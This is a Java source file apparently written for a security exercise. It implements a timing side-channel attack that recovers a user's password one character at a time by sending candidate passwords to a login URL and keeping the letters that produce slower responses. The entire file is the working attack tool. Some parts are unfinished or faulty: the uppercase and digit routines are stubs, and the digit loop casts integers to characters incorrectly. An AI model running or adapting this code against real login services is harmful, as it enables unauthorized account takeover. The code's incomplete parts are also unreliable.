import java.util.*;

public class SolvePassword {

    private int length;
    private String baseUrl;
    private String username;
    private double lastWorstTime;
    private Integer difficulty;
    private ArrayList<Character> checkLetter;
    private int delta;
    final private   ArrayList<Character> smallLetterByFrequency = new ArrayList<Character>(
            Arrays.asList('p','x','q','o','w','j','s','z','e','r','d','c','u','m','f'
                        ,'h','g','i','y','b','v','k','t','n','a','l'));
    final private   ArrayList<Character> capitalLetterByFrequency = new ArrayList<Character>(
            Arrays.asList('E','T','A','O','I','N','S','R','H','L','D','C','U','M','F'
                    ,'P','G','W','Y','B','V','K','X','J','Q','Z'));

    public SolvePassword(int length, String baseUrl, String username, Integer difficulty) {
        this.length = length;
        this.baseUrl = baseUrl;
        this.username = username;
        this.difficulty = difficulty;
        checkLetter = new ArrayList<>();
    }

    public String solvePassword(){
        StringBuilder password = createFirstPassword();
        lastWorstTime = createLastWorstTime(password);

        for (int i=0;i<length;i++){
            delta = 4;
            initCheckLetter();
            password.setCharAt(i, measureTimeForGivenChars(password,i));
        }
        return password.toString();
    }

    public void initCheckLetter(){
        checkLetter = new ArrayList<Character>(
                Arrays.asList('p','x','q','o','w','j','s','z','e','r','d','c','u','m','f'
                        ,'h','g','i','y','b','v','k','t','n','a','l'));
    }

    private double createLastWorstTime(StringBuilder password) {
        String url = createUrl(this.baseUrl, this.username, password.toString(), difficulty);
        URLRequest urlRequest = new URLRequest(url);
        return urlRequest.measureConnectionToGivenURLMinimum(10);
    }

    private StringBuilder createFirstPassword() {
        String tempPassword= "";
        for(int i=0;i<length;i++){
            tempPassword+="e";
        }
        StringBuilder password=new StringBuilder();
        password.append(tempPassword);

        return password;
    }

    private char measureTimeForGivenChars(StringBuilder password, int charPosition){
        HashMap<Character,Double> measureEachChar = new HashMap<>();
        for(int j=0;j<smallLetterByFrequency.size();j++){
            password.setCharAt(charPosition,smallLetterByFrequency.get(j));
            String url = createUrl(this.baseUrl, this.username, password.toString(), difficulty);
            URLRequest urlRequest = new URLRequest(url);
            double time = urlRequest.measureConnectionToGivenURLMinimum(2);
            if(time- lastWorstTime<delta){
                checkLetter.remove(smallLetterByFrequency.get(j));
                continue;
            }
            measureEachChar.put(smallLetterByFrequency.get(j),time);
            //System.out.println("letter is " +smallLetterByFrequency.get(j) + " time is: " + time );
        }
        HashMap<Character,Double> measureEachCharChecks = new HashMap<>(measureEachChar);

        int numOfChecks=2;
        int counter = 0;

        while(checkLetter.size()>1 && counter<4){
            counter++;
            measureEachChar=measureEachCharChecks;


            for(int i = 0;i<checkLetter.size();i++){
                password.setCharAt(charPosition,checkLetter.get(i));
                String url = createUrl(this.baseUrl, this.username, password.toString(), difficulty);
                URLRequest urlRequest = new URLRequest(url);
                double time = urlRequest.measureConnectionToGivenURLMinimum(numOfChecks);
                if(time- lastWorstTime<delta || measureEachCharChecks.get(checkLetter.get(i))-lastWorstTime<delta){
                    measureEachCharChecks.remove(checkLetter.get(i));
                    continue;
                }
                if(measureEachCharChecks.get(checkLetter.get(i))>time){
                    measureEachCharChecks.put(checkLetter.get(i),time);
                }
            }


            checkLetter = new ArrayList<>(measureEachCharChecks.keySet());
        }

        if(checkLetter.size()==1){
            lastWorstTime = measureEachCharChecks.get(checkLetter.get(0));
            System.out.println("letter in place "+ charPosition + " is "+ checkLetter.get(0));
            return checkLetter.get(0);


        }else if (checkLetter.size()==0){
            System.out.println("----error to low delta-----");
            char solvedChar= measureEachChar.entrySet().stream().max((entry1, entry2) -> entry1.getValue() > entry2.getValue() ? 1 : -1).get().getKey();
            lastWorstTime =measureEachChar.get(solvedChar);
            System.out.println("letter in place "+ charPosition + " is "+ solvedChar);
            return solvedChar;
        }
        else{
            System.out.println("----reach risk-----");
            HashMap<Character,Double> findMax = allMax(measureEachCharChecks);
            if(findMax.size()==1){
                char solvedChar = findMax.keySet().stream().findFirst().get();
                lastWorstTime = findMax.values().stream().findFirst().get();
                System.out.println("letter in place "+ charPosition + " is "+ solvedChar);
                return solvedChar;
            }else{
                char solvedChar = finalCheck(measureEachCharChecks,charPosition,password);
                System.out.println("letter in place "+ charPosition + " is "+ solvedChar);
                lastWorstTime = measureEachCharChecks.get(solvedChar);
                return solvedChar;
            }
        }
    }

    private char finalCheck(HashMap<Character, Double> measureEachCharChecks, int charPosition, StringBuilder password) {
        int numOfChecks = 10;
        for(int i = 0;i<checkLetter.size();i++){
            password.setCharAt(charPosition,checkLetter.get(i));
            String url = createUrl(this.baseUrl, this.username, password.toString(), difficulty);
            URLRequest urlRequest = new URLRequest(url);
            double time = urlRequest.measureConnectionToGivenURLMinimum(numOfChecks);

            if(time- lastWorstTime<delta || measureEachCharChecks.get(checkLetter.get(i))-lastWorstTime<delta){
                measureEachCharChecks.remove(checkLetter.get(i));
                continue;
            }
            if(measureEachCharChecks.get(checkLetter.get(i))>time){
                measureEachCharChecks.put(checkLetter.get(i),time);
            }
        }
        return measureEachCharChecks.entrySet().stream().max((entry1, entry2) -> entry1.getValue() > entry2.getValue() ? 1 : -1).get().getKey();

    }

    private  HashMap<Character, Double> allMax(HashMap<Character, Double> measureEachCharChecks) {
        double max = measureEachCharChecks.entrySet().stream().max((entry1, entry2) -> entry1.getValue() > entry2.getValue() ? 1 : -1).get().getValue();
        HashMap<Character, Double> result = new HashMap<>();
        for (Map.Entry<Character, Double> entry : measureEachCharChecks.entrySet()) {
            if (entry.getValue().equals(max)) {
                result.put(entry.getKey(),entry.getValue());
            }
        }
        return result;
    }

    private String measureTimeForUpperCase(StringBuilder password,int charPosition){
        for(int j=0;j<capitalLetterByFrequency.size();j++){
            password.setCharAt(charPosition,capitalLetterByFrequency.get(j));
            String url = createUrl(this.baseUrl, this.username, password.toString(), 2);
            URLRequest urlRequest = new URLRequest(url);
            double time = urlRequest.measureConnectionToGivenURLMedian();
        }
        return "";
    }

    private String measureTimeForDigits(StringBuilder password,int charPosition){
        for(int j=0;j<10;j++){
            ///check!
            password.setCharAt(charPosition,(char) j);
            String url = createUrl(this.baseUrl, this.username, password.toString(), 2);
            URLRequest urlRequest = new URLRequest(url);
            double time = urlRequest.measureConnectionToGivenURLMedian();
        }
        return "";
    }


    private String createUrl(String baseUrl, String username, String password, Integer difficulty){
        String url_format = baseUrl + "?user=%s&password=%s&difficulty=%d";
        String url = String.format(url_format,username, password, difficulty);
        return url;
    }


}
